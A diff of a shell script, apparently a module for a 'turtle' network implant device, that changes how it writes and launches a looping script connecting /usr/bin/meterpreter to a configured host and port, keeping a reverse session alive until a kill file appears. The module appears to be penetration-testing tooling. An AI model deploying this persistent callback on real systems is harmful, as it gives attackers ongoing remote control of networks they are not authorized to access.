@@ -10,35 +10,43 @@ CONF=/tmp/meterpreter.form
 : ${DIALOG_ESC=255}
 
 function start {
- if [ -s /etc/config/meterpreter ]
+  if [ -s /etc/config/meterpreter ]
   then
-    rm /tmp/meterpreter_exec
-    touch /tmp/meterpreter_exec
-    chmod +x /tmp/meterpreter_exec
+    if [ -x /etc/turtle/meterpreter/meterpreter_exec ]
+    then
+        echo "/etc/turtle/meterpreter/meterpreter_exec" | at now
+        echo "Meterpreter started with pid:"
+        pidof meterpreter
+    else
+        mkdir /etc/turtle/meterpreter
+        rm /etc/turtle/meterpreter/meterpreter_exec
+        touch /etc/turtle/meterpreter/meterpreter_exec
+        chmod +x /etc/turtle/meterpreter/meterpreter_exec
 
-    echo '''#!/bin/bash
-    rm /tmp/killmeterpreter
-    DATE=$(date)
-    IP=$(uci get meterpreter.host)
-    PORT=$(uci get meterpreter.port)
-    DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-    [[ "$IP" == "" || "$PORT" == "" ]] && {
-    logger "Meterpreter: Error, configuration blank"
-    echo "Meterpreter: Error, configuration blank"
-    } || {
-    while [ ! -f /tmp/killmeterpreter ]; do
-    echo "Started Meterpreter at $DATE with $IP $PORT"
-    logger "Meterpreter: Started at $DATE with $IP $PORT"
-    /usr/bin/meterpreter $IP $PORT
-    done
-    rm /tmp/killmeterpreter
-    echo "Stopped Meterpreter at $DATE with $IP $PORT"
-    logger "Meterpreter: Stopped at $DATE with $IP $PORT"
-    }''' > /tmp/meterpreter_exec
+        echo '''#!/bin/bash
+        rm /tmp/killmeterpreter
+        DATE=$(date)
+        IP=$(uci get meterpreter.host)
+        PORT=$(uci get meterpreter.port)
+        DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+        [[ "$IP" == "" || "$PORT" == "" ]] && {
+        logger "Meterpreter: Error, configuration blank"
+        echo "Meterpreter: Error, configuration blank"
+        } || {
+        while [ ! -f /tmp/killmeterpreter ]; do
+        echo "Started Meterpreter at $DATE with $IP $PORT"
+        logger "Meterpreter: Started at $DATE with $IP $PORT"
+        /usr/bin/meterpreter $IP $PORT
+        done
+        rm /tmp/killmeterpreter
+        echo "Stopped Meterpreter at $DATE with $IP $PORT"
+        logger "Meterpreter: Stopped at $DATE with $IP $PORT"
+        }''' > /etc/turtle/meterpreter/meterpreter_exec
 
-    echo "/tmp/meterpreter_exec" | at now
-    echo "Stageless Meterpreter started with pid:"
-    pidof meterpreter
+        echo "/etc/turtle/meterpreter/meterpreter_exec" | at now
+        echo "Stageless Meterpreter started with pid:"
+        pidof meterpreter_sl
+    fi
  else
     echo "Meterpreter not configured"
   fi
